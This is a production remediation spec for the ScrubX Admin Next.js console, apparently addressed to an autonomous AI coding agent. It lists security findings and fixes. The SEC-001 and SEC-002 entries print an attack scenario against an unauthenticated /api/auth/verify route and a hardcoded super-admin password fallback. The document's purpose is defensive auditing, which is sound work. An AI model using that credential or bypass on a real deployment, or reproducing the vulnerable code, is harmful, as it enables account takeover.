# ScrubX Admin — Production Remediation Plan

> **Implementation-ready engineering specification**
> **Prepared for:** an autonomous AI coding agent (Antigravity) executing fixes systematically
> **Repository:** `m-rehanamjad/scrubx-admin`
> **Baseline commit:** `1c95ad763a54c9171a37b169ef08df91c990d675`
> **Branch this plan was authored on:** `arena/b74cd051-scrubx-admin`
> **Audit date:** 2026-11-08
> **Document status:** Specification only — **no application code, schema, or existing documentation has been modified**

---

## Document Control

| Item | Value |
|---|---|
| Total issues specified | **105** |
| Priority P0 | **27** |
| Priority P1 | **41** |
| Priority P2 | **27** |
| Priority P3 | **10** |
| Verification method | Direct re-read of every affected source file at the baseline commit |
| Source of truth | Repository source code > `supabase/migrations/*.sql` > `docs/ai-context/*.md` |
| Findings that could not be verified | See §3.4 and §11.4 |

### How to use this document

1. Read §1–§5 completely before touching code.
2. Execute **Phase 0** exactly as written and record its outputs.
3. Work issues in the order given by §12 (dependency ordering), not by ID order.
4. For each issue: read the listed **Affected Files**, confirm the code still matches **Current Implementation**, then implement **Required Implementation**.
5. Mark the progress checklist honestly (§15). Never mark `Verified` without executing the stated **Testing Requirements**.
6. Obey all 14 **Implementation Safety Rules** in §4.2 without exception.

### Progress checklist convention

Every issue carries this checklist. All boxes start **unchecked**. Tick exactly one state at a time (untick the previous one). The authoritative roll-up lives in §15.

```
- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed
```

---

## Table of Contents

1. [Project Overview and Technology Stack](#1-project-overview-and-technology-stack)
2. [Audit Scope and Source References](#2-audit-scope-and-source-references)
3. [Executive Summary](#3-executive-summary)
4. [Overall Remediation Strategy](#4-overall-remediation-strategy)
5. [Implementation Phases](#5-implementation-phases)
6. [Detailed Issue Specifications](#6-detailed-issue-specifications)
7. [Affected File Reference Index](#7-affected-file-reference-index)
8. [Database Migration Plan](#8-database-migration-plan)
9. [Performance Optimization Plan](#9-performance-optimization-plan)
10. [Security Remediation Plan](#10-security-remediation-plan)
11. [Testing and Acceptance Criteria](#11-testing-and-acceptance-criteria)
12. [Dependency Ordering Between Issues](#12-dependency-ordering-between-issues)
13. [Risk Assessment](#13-risk-assessment)
14. [Production Deployment Checklist](#14-production-deployment-checklist)
15. [Final Progress Tracking Table](#15-final-progress-tracking-table)

---

# 1. Project Overview and Technology Stack

## 1.1 Purpose

**ScrubX Admin** is the internal operations console for ScrubX, a Pakistani medical-apparel brand selling scrubs, lab coats and accessories to doctors, nurses and medical students. The console is used by store staff and administrators to manage the catalog (products → colours → size variants → inventory), review orders, verify manual bank/wallet payment proofs, process custom engraving requests, dispatch shipments, manage coupons/shipping/payment methods, and read dashboard performance.

This is an **admin-only** application. There is no public storefront or customer-facing UI in this repository, and public registration is intentionally disabled in Better Auth. That constraint is important: every authenticated principal in this app is expected to be staff, yet the current code does not enforce it (see SEC-004).

## 1.2 Technology stack (verified from `package.json`)

| Layer | Technology | Declared version | Notes |
|---|---|---|---|
| Framework | Next.js App Router | `^16.4.5` | RSC, Server Actions, `proxy.ts` middleware convention |
| UI runtime | React | `^19.2.0` | Server + client components |
| Language | TypeScript | `~5.9.3` | strict mode, native type stripping for scripts |
| Styling | Tailwind CSS v4 + `@tailwindcss/postcss` | `^4.3.4` | Utility-first |
| Primitives | Radix UI (avatar, checkbox, dialog, dropdown-menu, label, popover, select, separator, slot, switch, tabs, toast, tooltip) | `^1.x`/`^2.x` | Accessible components |
| Icons / motion | `lucide-react` `^0.577.0`, `framer-motion` `^12.35.0` | Used in UI + toast animations |
| Charts | `recharts` `^3.10.1` | Dashboard only |
| Database | Managed PostgreSQL (Supabase host, **Postgres only**) | PostgreSQL 17.x | 24 application tables |
| ORM | Drizzle ORM / Drizzle Kit | `^0.38.4` / `^0.30.2` | Schema in `src/db/schema/` |
| DB driver | `postgres` (postgres.js) | `^3.4.5` | `prepare: false` for Supavisor |
| Auth | Better Auth | `^1.7.17` | `ba_user` / `ba_session` / `ba_account` tables |
| Media | ImageKit (`imagekit` `^6.0.0`, `@imagekit/next` `^2.1.6`) | Direct browser upload + server SDK |
| Validation | Zod `^4.6.7`, React Hook Form `^7.91.0` | Action + form validation |
| Utilities | `date-fns` `^4.4.0` (**unused**), `clsx`, `tailwind-merge`, `class-variance-authority` | |

## 1.3 Architecture as it actually exists

```
src/app/**/page.tsx        → RSC data loading (requireStaffContext → service → DTO → client view)
src/app/**/route.ts        → 6 route handlers (auth, upload auth, inventory ×3)
src/views/*.tsx            → 18 client components ("use client") that receive props and call Server Actions
src/actions/*.ts           → 12 Server Action modules, all wrapped in createSafeAction
src/server/services/*.ts   → 11 services (business rules, transactions, authorization via assertRole)
src/server/repositories/*  → 12 repositories (Drizzle queries, row locking)
src/server/validation/*    → 12 Zod schema modules
src/db/schema/*            → Drizzle table definitions (source for TS types)
supabase/migrations/*.sql  → hand-written SQL DDL (source of truth for the live database)
src/lib/dto.ts             → DB row → view model mappers
src/lib/auth-guard.ts      → redirect-based guard (used by 2 files only)
src/server/auth.ts         → error-based guard (used by everything else)
src/proxy.ts               → Next.js 16 proxy: cookie-presence check only
```

Two authorization stacks, two order state machines (server + client), and two schema definitions (Drizzle + SQL) coexist. Several defects in this plan exist *because* those pairs have drifted apart. The remediation strategy (§4) deliberately unifies each pair rather than patching both sides independently.

## 1.4 Business-critical invariants

These must hold before and after every change. Any fix that breaks one of them is rejected.

| # | Invariant | Current enforcement |
|---|---|---|
| I1 | `quantity_available = quantity_on_hand - quantity_reserved ≥ 0` | DB CHECK + service guards |
| I2 | Reserved stock is consumed exactly once when an order is paid/confirmed | `commitOrderSale` (idempotent) |
| I3 | Engraved orders cannot use Cash on Delivery | App check + `trg_check_engraving_cod` trigger |
| I4 | Order status moves only along the FSM | Service-level `ALLOWED_STATUS_TRANSITIONS` (bypassable — BUG-006) |
| I5 | A coupon redemption increments `coupons.usage_count` exactly once | `recordRedemption` inside order transaction |
| I6 | Money is `numeric(12,2)`; totals = subtotal + engraving − discount + shipping | App arithmetic + DB checks |
| I7 | Payment proofs are private to staff | **Violated** — files live under `public/proofs/` (SEC-014) |
| I8 | Only staff/admin/super_admin can mutate data | **Partially violated** — SEC-004, SEC-005 |

---

# 2. Audit Scope and Source References

## 2.1 Scope

**In scope (fully re-read at the baseline commit):**

- `package.json`, `next.config.ts`, `tsconfig.json`, `eslint.config.js`, `drizzle.config.ts`, `.gitignore`, `.env.example`, `README.md`
- `src/proxy.ts` (Next.js 16 middleware replacement)
- `supabase/migrations/20261105000000_initial_schema.sql`, `20261105000001_phase3_schema_refinements.sql`, `meta/_journal.json`
- All 18 files in `src/db/schema/` + `src/db/index.ts`, `src/db/migrate.ts`, `src/db/verify-connection.ts`
- All 12 modules in `src/server/validation/`
- All 12 modules in `src/server/repositories/`
- All 11 modules in `src/server/services/`
- All 12 modules in `src/actions/`
- `src/server/auth.ts`, `src/server/action-client.ts`, `src/server/errors.ts`, `src/server/types.ts`
- All 6 route handlers under `src/app/api/`
- All 18 `page.tsx` files, `layout.tsx`, `error.tsx`, `loading.tsx` (×12), `not-found.tsx`
- All 18 views in `src/views/`
- All shared/layout/UI components in `src/components/`
- `src/scripts/create-admin.ts`, `src/scripts/seed-database.ts` (and the 10 other `test-*.ts` helper scripts)
- `docs/ai-context/*.md` (8 documents) and `.agent/skills/project-context-management/SKILL.md`
- `.github/` — **absent** (verified: no CI workflows exist)

**Out of scope:** the customer-facing storefront (not in this repository), Supabase Auth/Storage (explicitly forbidden by ADR 002), and the actual production database contents. Any claim requiring production data or live credentials is marked **Requires Investigation / Not Verified**.

## 2.2 Method

1. Every audit finding was re-located in source and re-read in full surrounding context (function-level, not line-level).
2. A finding is marked **Confirmed** only when the defective behaviour is visible in the committed code path that production executes.
3. **Potential** means the code is defective but exploitation/impact depends on deployment configuration or data state that cannot be observed here.
4. **Already Fixed** is used where the previous audit narrative is stale relative to the code.
5. **Requires Investigation** means the defect cannot be proven without a database or external service.
6. Priorities from the audit are preserved. No finding was dropped; the four smallest were merged into a parent issue and are listed explicitly inside it so nothing is lost.

## 2.3 Baseline health checks (already executed, reproducible)

| Check | Command | Result at baseline |
|---|---|---|
| Dependency install | `npm ci --ignore-scripts --legacy-peer-deps` | Succeeds **only** with `--legacy-peer-deps` (ARCH-008) |
| Type check | `./node_modules/.bin/tsc --noEmit` | Exit 0 (clean) |
| Lint | `./node_modules/.bin/eslint .` | Exit 0 (warnings only, `<img>` advisories resolved — 0 remaining) |
| Dependency audit | `npm audit --json` | 15 advisories: 1 high, 14 moderate (ARCH-008) |
| Test suite | — | **No test runner configured** (TEST-001) |
| CI | `.github/workflows` | **Absent** |

Re-run all of these in Phase 0 and record the outputs. Do not trust these numbers; re-measure.

## 2.4 Documentation drift that this plan must resolve

`docs/ai-context/` is the project's persistent memory and is governed by `.agent/skills/project-context-management/SKILL.md`. It currently contains stale statements that will actively mislead an implementing agent:

| Document | Stale claim | Reality |
|---|---|---|
| `ARCHITECTURE.md:16,224` | Views read/write `useStore()` from `src/data/mock.ts` + `localStorage` | No view imports `useStore`; `src/data/*` is dead code (ARCH-004) |
| `PENDING_TASKS.md:150-190` | Phase 6E (view migration) and Phase 7 entirely unchecked | All 18 views already receive server props and call Server Actions |
| `AUTH_CONTEXT.md` | Uppercase role names (`ADMIN`, `STAFF`) | Canonical lowercase per ADR 008 |
| `PROJECT_OVERVIEW.md:69` | Mock data "must remain functional" | Nothing references it |
| `PENDING_TASKS.md:186` | "Decommission `src/data/*`" open | Still tracked and shipped |

ARCH-010 tracks the correction. Do not "fix" code to match the docs; fix the docs to match the code.

---

# 3. Executive Summary

## 3.1 Verdict

The repository is **type-clean and lint-clean but not production-safe**. Its layering (validation → action wrapper → service → repository → Drizzle) is genuinely good, and its transaction discipline (uniform lock ordering, `FOR UPDATE`, idempotent stock commitment) shows deliberate design. The critical defects are not architectural rot; they are **enforcement gaps at the edges** — a debug route shipped to production, a role fallback that promotes unknown roles, an upload endpoint that vouches for any logged-in user, and a set of service methods that skip the guards their siblings enforce.

Three findings are severe enough that the application should not be exposed to the internet until fixed:

1. **SEC-001/SEC-002** — `GET /api/auth/verify` is an unauthenticated endpoint that signs in as `admin@scrubx.pk` using `process.env.ADMIN_PASSWORD || "Admin@ScrubX2026!"`. Anyone who can reach the deployment can mint a `super_admin` session.
2. **SEC-004** — `getCurrentAdmin()` coerces any role it does not recognise to `staff` (`src/server/auth.ts:71-73`), and `src/lib/auth-guard.ts` defaults a missing role to `staff`. A Better Auth user row with role `customer` therefore passes every `staff` guard.
3. **SEC-005/SEC-007** — `/api/upload/auth` issues ImageKit upload signatures to any authenticated user without a role check, and the server upload path trusts the client-declared MIME type while explicitly allowing `image/svg+xml`, which yields stored XSS on `ik.imagekit.io`.

## 3.2 Issue distribution

| Category | IDs | Count | Highest priority |
|---|---|---|---|
| Security | SEC-001…SEC-014 | 14 | P0 |
| Functional bugs | BUG-001…BUG-034 | 34 | P0 |
| Database | DB-001…DB-016 | 16 | P0 |
| Performance | PERF-001…PERF-012 | 12 | P1 |
| Architecture / infra | ARCH-001…ARCH-010 | 10 | P1 |
| E-commerce gaps | ECOM-001…ECOM-012 | 12 | P2 |
| Testing | TEST-001…TEST-007 | 7 | P1 |
| **Total** | | **105** | |

Priority roll-up: **P0 = 27, P1 = 41, P2 = 27, P3 = 10.** The complete per-issue mapping is in §15.

## 3.3 What "done" means

- Phase 0–3 complete: no P0 or P1 issue remains `Not Started`.
- Phase 6 complete: `npm run lint`, `tsc --noEmit`, `npm run build`, the new test suite and the authorization matrix all pass in CI.
- §14 deployment checklist fully ticked, including the post-migration duplicate-data audit.
- §15 shows every issue at `Verified` or `Completed`, with the verifying command recorded.

## 3.4 Findings that could not be verified here (prerequisites)

| Finding | Why unverifiable | Required to close |
|---|---|---|
| Production `ba_user` role values (does any row have `customer`, `NULL`, or an unexpected casing?) | Requires production DB read | `SELECT role, count(*) FROM ba_user GROUP BY role;` — Phase 0 |
| Whether `customers.email` already contains duplicates | Requires production DB read | Duplicate query in §8.3 (DB-001) |
| Whether `order_number` values collide (`SX-` + last 6 ms digits) | Requires production DB read | Duplicate query in §8.3 (DB-008) |
| Whether `payment_methods.code` contains `nayapay` in production | Seed inserts `jazzcash`, `easypaisa`, `sadapay`, `bank_transfer`, `cod` only — `nayapay` is in the TypeScript union but never seeded | `SELECT code FROM payment_methods;` |
| Effective Supavisor pool size and per-instance connection count | Requires hosting configuration | Provider dashboard + `pg_stat_activity` |
| `ImageKit` account allowed file types / folder-level restrictions | Requires ImageKit dashboard | Account settings screenshot or API read |
| Real query counts and latencies | Requires a running DB with `pg_stat_statements` | `EXPLAIN (ANALYZE, BUFFERS)` in staging — §9.6 gives *targets*, not measurements |
| Whether `npm audit` advisories are reachable at runtime | Requires per-advisory triage | `npm audit fix` in a branch + review (ARCH-008) |

**Rule:** never convert any item above into a fabricated measurement, count, or "fixed" claim. If a fix depends on one of them, implement the code so it is correct for all possible data states and leave the verification step explicitly pending.

---

# 4. Overall Remediation Strategy

## 4.1 Strategy

**S1 — Close the front door first.** Phase 1 removes authentication bypasses before any business-logic work. Nothing else matters if an anonymous request can become `super_admin`.

**S2 — Fix invariants at the choke point, not at the call sites.** Order/payment/stock integrity is enforced in services, but several entry points (`updateOrderShipping`, `submitPaymentProof`, `refundPayment`) bypass the FSM. Fix the *service* so every caller inherits the guard, then add regression tests at the action/route layer.

**S3 — One source of truth per concept.** Server FSM, client FSM and DB enum collapse to one module (ARCH-005). Two auth stacks collapse to one (ARCH-001). Drizzle schema and SQL migrations reconcile with an explicit reconciliation migration (DB-002…DB-004).

**S4 — Migrate data before constraining it.** Every new unique index or constraint is preceded by a detection query and a documented cleanup procedure (§8.3). No constraint is added blind.

**S5 — Measure, don't guess.** Query-count reductions are specified as *targets* with the exact SQL to count them (§9.6). No latency figures are invented anywhere in this document.

**S6 — No opportunistic refactors.** Each issue's diff must be explainable by its own "Required Implementation" section (Safety Rule 1). Dead-code removal (ARCH-004), dependency pruning (ARCH-007) and documentation sync (ARCH-010) are their own issues, not side effects.

## 4.2 Implementation Safety Rules (mandatory, all 14)

These rules bind the implementing agent for the entire plan.

1. **Never perform unrelated refactoring while fixing an issue.** The diff for issue X must contain only what X's *Required Implementation* lists. If you notice another defect, record it — do not fix it in the same change.
2. **Never remove existing business functionality without an approved replacement.** Deleting a code path (e.g. the `/api/inventory*` routes, ARCH-002) requires the documented replacement to exist, be wired, and be tested first.
3. **Preserve existing UI design and workflows unless the issue explicitly requires a change.** No restyling, no layout rework, no "modernisation". When a change is required, keep the existing component structure and Tailwind tokens (`border-line`, `bg-surface`, `text-ink`, `text-ink-muted`).
4. **Preserve existing database records.** No `DROP TABLE`, no `TRUNCATE`, no destructive column drops without a documented, tested data-preservation step (§8.4). Soft-delete stays soft-delete.
5. **Use database transactions for operations that must remain atomic.** Any operation touching ≥2 of {order, payment, inventory, coupon} stays inside a single `db.transaction`, preserving the global lock order `orders → payments → inventory` (ADR 020) and deterministic `ORDER BY` on locked rows.
6. **Enforce authorization on the server.** Every Server Action, route handler and RSC data load re-checks the session and role. Client-side hiding is cosmetic only and is never accepted as a fix.
7. **Validate all untrusted inputs.** Every action/route input is parsed by a Zod schema; every file upload is validated by content, not by the declared MIME type; every ID is validated as a UUID; every redirect target is validated as a same-origin relative path.
8. **Avoid unnecessary dependencies.** No new package unless the plan names it and justifies it. Prefer `node:crypto`, `next/*` and what is already installed.
9. **Do not expose secrets or credentials.** Never log, return, echo, or commit an env value; never print `.env*` contents; never put a secret in an error message, a DTO, or a client bundle. Do not weaken the existing server-only boundary guards in `src/db/index.ts` and `src/lib/imagekit.ts`.
10. **Do not make production database changes without explicit approval.** The agent may author migration files and may run them against a local/staging database. Applying to production requires a human go/no-go per §14.
11. **Do not silently ignore failed operations.** No empty `catch {}`, no `catch` that only logs where the caller cannot see failure, no swallowed `NEXT_REDIRECT`. Cleanup of external assets (ImageKit) must be recorded and retried, not dropped.
12. **Never claim a bug is fixed without verification.** "Implemented" ≠ "Verified". Record the exact command/step that proved it (§15).
13. **Update relevant documentation when architectural decisions change.** Per `.agent/skills/project-context-management/SKILL.md`: append to `IMPLEMENTATION_LOG.md`, tick `PENDING_TASKS.md`, and add an ADR to `DECISIONS.md` when a fix changes an architectural rule (e.g. single auth stack, unified FSM).
14. **Do not implement optional P2/P3 features as part of critical bug fixes.** Phases 1–3 must not pull in Phase 5 work. If a P2 item is a hard dependency of a P0 (e.g. DB-013 unique index is needed for ECOM-006), the dependency is implemented and explicitly cross-referenced — nothing more.

## 4.3 Definition of Done for every issue

An issue may be marked `Completed` only when all of the following are true:

- [ ] Code changes are limited to the issue's *Affected Files* (plus tests and the docs named in Rule 13).
- [ ] `./node_modules/.bin/tsc --noEmit` exits 0.
- [ ] `./node_modules/.bin/eslint .` exits 0 with no new warnings.
- [ ] The issue's *Testing Requirements* were executed and their results recorded.
- [ ] Every *Acceptance Criteria* box is ticked with evidence.
- [ ] No Safety Rule was violated.
- [ ] If schema changed: migration file added, applied to a scratch DB, rolled back, re-applied successfully.
- [ ] `docs/ai-context/` updated (Rule 13).

---

# 5. Implementation Phases

Phases are ordered by **blast radius × exploitability**, not by file convenience. The audit's P0–P3 priorities are preserved verbatim on each issue; phases only decide sequencing. Any reordering versus the audit is explained inline.

## Phase 0 — Preparation and Baseline Verification

**Objective:** establish a trustworthy baseline so that every later claim is verifiable.

| Step | Action | Evidence to record |
|---|---|---|
| 0.1 | Read `docs/ai-context/{ARCHITECTURE,AUTH_CONTEXT,DATABASE_CONTEXT,DECISIONS,IMAGEKIT_CONTEXT,IMPLEMENTATION_LOG,PENDING_TASKS,PROJECT_OVERVIEW}.md` | Note the drifts listed in §2.4 |
| 0.2 | Read `.agent/skills/project-context-management/SKILL.md` | Confirm the pre/post-execution protocol |
| 0.3 | `git rev-parse HEAD` → must equal `1c95ad763a54c9171a37b169ef08df91c990d675` (or a documented descendant) | Commit hash in the log |
| 0.4 | `git status --short` → must be clean | Empty output |
| 0.5 | `npm ci --ignore-scripts --legacy-peer-deps` | Success; note the peer-dependency failure without the flag (ARCH-008) |
| 0.6 | `./node_modules/.bin/tsc --noEmit` | Exit 0 |
| 0.7 | `./node_modules/.bin/eslint .` | Exit 0, 0 new warnings |
| 0.8 | `npm run build` | Success; record route table |
| 0.9 | `npm audit --json` | 15 advisories (1 high / 14 moderate) — reconcile |
| 0.10 | Copy `.env.example` → `.env.local` and fill only local/staging values | Never commit; never print values |
| 0.11 | Run the read-only queries in §8.2 and §8.3 against a **staging** database | Store results as the data-state baseline |
| 0.12 | Confirm no `.github/` directory exists | `ls .github` → absent |
| 0.13 | Record which of the §3.4 prerequisites are still open | List in the log |

**Exit criteria:** clean tree, green type-check/lint/build, dependency audit reconciled, staging data-state recorded, and a written list of blocked verifications.

## Phase 1 — Critical Security Fixes (P0)

**Objective:** remove every path from unauthenticated → authenticated, and from authenticated-non-staff → staff.

Issues: SEC-001, SEC-002, SEC-003, SEC-004, SEC-005, SEC-006, SEC-007, SEC-008, SEC-009, SEC-014, SEC-013.
Also in this phase (dependency-blocking, low effort): ARCH-001 (unify auth stacks) is **prerequisite** to SEC-004, and ARCH-003 (anonymous `staff` context) is a latent member of the same family.

Ordering rationale: SEC-004 (role coercion) must land together with ARCH-001, because fixing the coercion in one of the two auth stacks leaves the other exploitable.

## Phase 2 — Core Business Logic and Data Integrity (P0)

**Objective:** make money, stock and order state provably consistent.

Issues: BUG-001 … BUG-013, BUG-017, DB-001, DB-008, DB-012, DB-013, BUG-021.

Ordering rationale: BUG-004 (lock ordering) precedes BUG-001/BUG-002/BUG-003 because all three change the same `createOrder` transaction; doing them in separate passes would produce three conflicting diffs. DB-001 precedes BUG-001 because atomic customer upsert is required for correct customer resolution.

## Phase 3 — Database and Backend Reliability (P1)

**Objective:** correct query semantics, remove query amplification, and make the schema match the code.

Issues: BUG-014 … BUG-034 (all remaining functional bugs), DB-002 … DB-007, DB-009 … DB-011, DB-014 … DB-017, PERF-001 … PERF-009, ARCH-002, ARCH-004, ARCH-005, ARCH-011, ARCH-012.

## Phase 4 — Frontend and Application Performance (P1/P2)

**Objective:** reduce client JS, eliminate leaks and duplicated fetches, and make list pages server-driven.

Issues: PERF-010, PERF-011, PERF-012, BUG-032, BUG-033, ARCH-006, ARCH-009, ARCH-010.

## Phase 5 — E-commerce Operational Improvements (P2/P3)

**Objective:** add the operational features an admin console of this class is expected to have.

Issues: ECOM-001 … ECOM-012.

## Phase 6 — Testing and Production Readiness

**Objective:** prove the system works and keep it working.

Issues: TEST-001 … TEST-007, ARCH-007 (build configuration), ARCH-008 (dependency hygiene), SEC-010, SEC-011, SEC-012.

Note: TEST-001 (test runner) is bootstrapped in Phase 3 so that Phase 1–3 fixes can ship with tests; Phase 6 completes coverage (E2E, load, security matrix) and CI gating.

## 5.1 Phase/priority reconciliation

| Deviation from a pure P0→P3 ordering | Reason |
|---|---|
| SEC-010/SEC-011/SEC-012 (P1) scheduled in Phase 6 | They are configuration/hardening, not exploitable bypasses; doing them earlier would delay P0 work |
| BUG-017 (P0) in Phase 2 but its UX consequence lands in Phase 3 | Files must stop being deleted eagerly *before* the image-reconciliation logic is rewritten |
| DB-013 (P2) executed in Phase 2 | It is a hard prerequisite for ECOM-006 and for a correct refund/duplicate-TID guard |
| ARCH-001, ARCH-003 placed in Phase 1 | Security dependencies, not architecture polish |
| ECOM-011 (P3) deferred to last | Depends on the notification model introduced in PERF-001 |

---

# 6. Detailed Issue Specifications

> **Reading order inside each issue:** Priority → Category → Severity → Verification Status → Affected Files → Problem → Current Implementation → Root Cause → Failure Scenario → Required Implementation → Expected Behaviour → Dependencies → Testing → Acceptance Criteria → Complexity → Progress.
>
> **Rule:** if the code no longer matches **Current Implementation**, stop and re-verify before implementing. The code is the authority; this document is the specification.

---

## 6.1 Security Issues

## 6.1.1 Authorization capability matrix (cross-cutting reference for SEC-004 / SEC-013 / BUG-026 / TEST-002)

Verified from `assertRole` calls in services and `requiredRole` in actions at the baseline commit.

| Capability | staff | admin | super_admin | Enforcement point |
|---|---|---|---|---|
| Read products/categories/inventory/orders/payments/customers/coupons/shipping/engraving/payment-methods | ✅ | ✅ | ✅ | services `assertRole(…, ["staff"])` |
| Create/update/archive/delete product | ❌ | ✅ | ✅ | `products.ts` `requiredRole: "admin"` |
| Create/update/delete category | ❌ | ✅ | ✅ | `categories.ts` |
| Adjust stock / restock | ❌ | ✅ | ✅ | `actions/inventory.ts:77,94` |
| Read inventory movements | ✅ | ✅ | ✅ | `actions/inventory.ts:74` |
| Create order | ✅ | ✅ | ✅ | `actions/orders.ts:20` |
| Update order status (FSM) | ❌ | ✅ | ✅ | `actions/orders.ts:38` |
| Update shipping / mark shipped / delivered | ✅ ⚠️ | ✅ | ✅ | `actions/orders.ts:57` — **BUG-006 bypass** |
| Add order note | ✅ | ✅ | ✅ | `actions/orders.ts:74` |
| Submit payment proof | ✅ | ✅ | ✅ | `actions/payments.ts:21` — **BUG-008 no state guard** |
| Approve/reject/refund payment | ❌ | ✅ | ✅ | `actions/payments.ts:38,56,73` |
| Mark payment paid/pending | ❌ | ✅ | ✅ | `actions/payments.ts:95,125` |
| Create/update/delete coupon | ❌ | ✅ | ✅ | `actions/coupons.ts` |
| Update customer / addresses / notes | ❌ | ✅ | ✅ | `customers.ts:19,36,52` |
| Manage shipping methods | ❌ | ✅ | ✅ | `shipping.ts` |
| Manage engraving options | ❌ | ✅ | ✅ | `engraving.ts` |
| Manage payment methods | ❌ | ✅ | ✅ | `payment-methods.ts` |
| **Read store settings** | ✅ | ✅ | ✅ | `settings.service.ts:45` |
| **Update store settings** | ❌ | ❌ → **should be** ❌ | ✅ | **SEC-013: currently `admin`** |
| Upload server media | ✅ ⚠️ | ✅ | ✅ | `media.ts` uses `requireStaff` + **SEC-006/007** |
| Delete media | ❌ | ✅ ⚠️ | ✅ | `media.ts` — **SEC-009** |
| Generate upload signature | ✅ ⚠️ | ✅ | ✅ | `/api/upload/auth` — **SEC-005** |

Amend this table whenever SEC-013 / ARCH-001 change an enforcement point, and keep TEST-002 in sync with it.

---

---

### SEC-001 — Public `/api/auth/verify` endpoint authenticates as super admin

**Priority:** P0
**Category:** Security
**Severity:** Critical
**Verification Status:** Confirmed

**Affected Files:**
```
src/app/api/auth/verify/route.ts
src/proxy.ts
package.json
```

**Problem Description:**
A diagnostic route handler is committed at `GET /api/auth/verify`. It is unauthenticated, unguarded, shipped in the production build, and performs real password sign-ins against the live Better Auth instance — including a successful login as `admin@scrubx.pk`. Anyone who can reach the deployment can obtain a valid `super_admin` session by calling one URL.

**Current Implementation:**
`src/app/api/auth/verify/route.ts` exports `async function GET()` with no session check, no role check, and no environment guard. It reads:

```ts
const testEmail = "admin@scrubx.pk";
const validPassword = process.env.ADMIN_PASSWORD || "Admin@ScrubX2026!";
```

and then calls `auth.api.signInEmail({ body: { email: testEmail, password: validPassword }, asResponse: true })`, capturing `set-cookie` into `activeCookie` and reusing that cookie for later assertions. The response body enumerates each assertion result, including the resolved role (`super_admin`). `src/proxy.ts` excludes `api/auth` in its matcher, so `/api/auth/verify` is never reached by the proxy and requires no cookie.

**Root Cause:**
A manual verification script was promoted from `src/scripts/test-auth.ts` into a Next.js route handler for convenience, with no `NODE_ENV !== "production"` guard and no removal step. Next.js route handlers are public by default; there is no deny-by-default mechanism.

**Real-World Failure Scenario:**
An attacker runs `curl https://admin.scrubx.pk/api/auth/verify` and reads a JSON body containing `"Admin Login with Valid Credentials": "PASS"` with `"Role: super_admin"`. If `ADMIN_PASSWORD` is unset in the deployment (the fallback is compiled in), the attacker also learns the exact default password used by `create-admin.ts`, then POSTs to `/api/auth/sign-in/email` and receives a `super_admin` session with full control of products, prices, orders, payments and settings.

**Required Implementation:**

1. **Delete** `src/app/api/auth/verify/route.ts`. This is not a refactor; it is removal of a debug endpoint.
2. Confirm no references: `grep -rn "api/auth/verify" src/` must return nothing.
3. Keep the CLI equivalent `src/scripts/test-auth.ts` (`npm run auth:test`), which is a Node script outside the HTTP surface and must never be imported by application code.
4. In `src/proxy.ts`, replace the broad `api/auth` exclusion with an explicit allowlist so future `api/auth/*` additions are not silently public. `/api/auth/[...all]` must remain reachable; anything else under `api/auth/*` must fall through to the session requirement (see SEC-011 for the API branch behaviour).
5. Add a CI guard (TEST-006) that fails if any `src/app/api/**/route.ts` contains `signInEmail` or `signIn`.

**Expected Behavior After Fix:**
`GET /api/auth/verify` returns `404`. No HTTP endpoint creates a session from a password except Better Auth's own `/api/auth/sign-in/email`, which is rate-limited (SEC-011). `npm run auth:test` still works from the CLI.

**Dependencies:**
- **Blocks** SEC-002 (removes one copy of the hardcoded password).
- **Related** SEC-011 (proxy matcher/API behaviour).

**Testing Requirements:**
- Normal: `curl -i <base>/api/auth/verify` → `404`.
- Normal: `POST /api/auth/sign-in/email` valid → `200` + cookie; invalid → `401`.
- Edge: `GET /api/auth/session` still resolves a valid session.
- Failure: production build route table contains no `/api/auth/verify`.
- Regression: `npm run auth:test` passes.

**Acceptance Criteria:**
- [x] `src/app/api/auth/verify/route.ts` no longer exists.
- [x] `grep -rn "api/auth/verify" src/` returns no matches.
- [x] `next build` route table has no `/api/auth/verify`.
- [x] `src/proxy.ts` no longer blanket-excludes `api/auth`.
- [x] `npm run auth:test` passes.
- [ ] CI guard rejects re-introduction.

**Implementation Complexity:** Low

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [x] Verified
- [x] Completed

---

### SEC-002 — Hardcoded credential fallbacks in application code

**Priority:** P0
**Category:** Security
**Severity:** Critical
**Verification Status:** Confirmed

**Affected Files:**
```
src/app/api/auth/verify/route.ts
src/scripts/create-admin.ts
src/scripts/test-auth.ts
.env.example
docs/ai-context/AUTH_CONTEXT.md
```

**Problem Description:**
Three files fall back to the literal password `Admin@ScrubX2026!` when `ADMIN_PASSWORD` is absent. Because `create-admin.ts` uses the same fallback, any deployment that ran `npm run auth:seed-admin` without setting `ADMIN_PASSWORD` has an administrator whose password is published in the repository.

**Current Implementation:**
- `src/scripts/create-admin.ts:26-29`:
  ```ts
  const email = (process.env.ADMIN_EMAIL || "admin@scrubx.pk").trim().toLowerCase();
  const name = (process.env.ADMIN_NAME || "Ayesha Rehman").trim();
  const password = process.env.ADMIN_PASSWORD || "Admin@ScrubX2026!";
  const role = (process.env.ADMIN_ROLE || "super_admin").trim().toLowerCase();
  ```
  Line 118 correctly avoids printing the password, but the fallback remains.
- `src/app/api/auth/verify/route.ts:9` uses the identical fallback (removed by SEC-001).
- `src/scripts/test-auth.ts:44` uses the identical fallback.

`.env.example` documents `DATABASE_URL`, `BETTER_AUTH_*`, and the three ImageKit keys, but **does not document `ADMIN_EMAIL` / `ADMIN_PASSWORD` / `ADMIN_ROLE` at all**, so operators are never prompted to set them.

**Root Cause:**
Convenience defaults were added so local seeding "just works". A password literal is a credential, not a default; credentials belong in `.env.local` only.

**Real-World Failure Scenario:**
An operator follows `README.md`, runs `npm run auth:seed-admin` with `DATABASE_URL` set and `ADMIN_PASSWORD` unset. A `super_admin` is created with `Admin@ScrubX2026!`. The literal is in git history. An attacker authenticates as that account.

**Required Implementation:**

1. In `src/scripts/create-admin.ts`, replace the fallback with fail-fast validation:
   - Missing `ADMIN_PASSWORD` ⇒ `process.exit(1)` with a message naming the variable and the minimum length (≥ 12). Never print a value.
   - Enforce length ≥ 12. Do not add a complexity regex that rejects legitimate passphrases.
   - Keep `ADMIN_EMAIL`/`ADMIN_NAME`/`ADMIN_ROLE` defaults (not secrets) but validate `ADMIN_ROLE ∈ {super_admin, admin, staff}` and reject `customer`.
2. In `src/scripts/test-auth.ts`, read the same variables and **skip** (exit 0 with "skipped: credentials not configured") instead of falling back.
